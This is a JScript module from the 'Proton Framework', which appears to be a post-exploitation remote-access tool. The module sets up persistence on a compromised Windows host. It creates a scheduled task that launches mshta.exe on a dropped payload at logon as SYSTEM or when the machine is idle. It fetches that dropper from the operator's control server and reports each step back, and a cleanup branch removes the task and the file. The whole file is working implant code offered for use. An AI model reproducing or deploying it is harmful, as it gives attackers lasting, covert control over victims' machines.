//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

try
{
    var headers = {};
    var taskname = "Proton";
    var droppath = proton.file.getPath("~FDROPDIR~\\~FDROPFILE~");
    if (~CLEANUP~)
    {
        var result = proton.shell.exec("schtasks /delete /tn "+taskname+" /f", "~DIRECTORY~\\"+proton.uuid()+".txt");
        headers["Task"] = "DeleteTask";
        proton.work.report(result, headers);
        headers["Task"] = "DeleteDropper";
        proton.file.deleteFile(droppath);
        proton.work.report(proton.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    else
    {
        var result = proton.shell.exec("schtasks /query /tn "+taskname, "~DIRECTORY~\\"+proton.uuid()+".txt");
        headers["Task"] = "QueryTask";
        proton.work.report(result, headers);
        if (~NOFORCE~)
        {
            if (result.indexOf("ERROR") == -1)
            {
                result = proton.shell.exec("schtasks /delete /tn "+taskname+" /f", "~DIRECTORY~\\"+proton.uuid()+".txt");
                headers["Task"] = "NoForceTask";
                proton.work.report("", headers);
            }
        }
        if (~ELEVATED~)
        {
            result = proton.shell.exec("schtasks /create /tn "+taskname+" /tr \"C:\\Windows\\system32\\mshta.exe "+droppath+"\" /sc onlogon /ru System /f", "~DIRECTORY~\\"+proton.uuid()+".txt");
        }
        else
        {
            result = proton.shell.exec("schtasks /create /tn "+taskname+" /tr \"C:\\Windows\\system32\\mshta.exe "+droppath+"\" /sc onidle /i 1 /f", "~DIRECTORY~\\"+proton.uuid()+".txt");
        }
        headers["Task"] = "AddTask";
        proton.work.report(result, headers);

        headers["X-UploadFileJob"] = "true";
        proton.http.downloadEx("POST", proton.work.make_url(), headers, droppath);
        headers["X-UploadFileJob"] = "false";
        headers["Task"] = "AddDropper";
        proton.work.report(proton.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    proton.work.report("Complete");
}
catch (e)
{
    proton.work.error(e);
}
proton.exit();
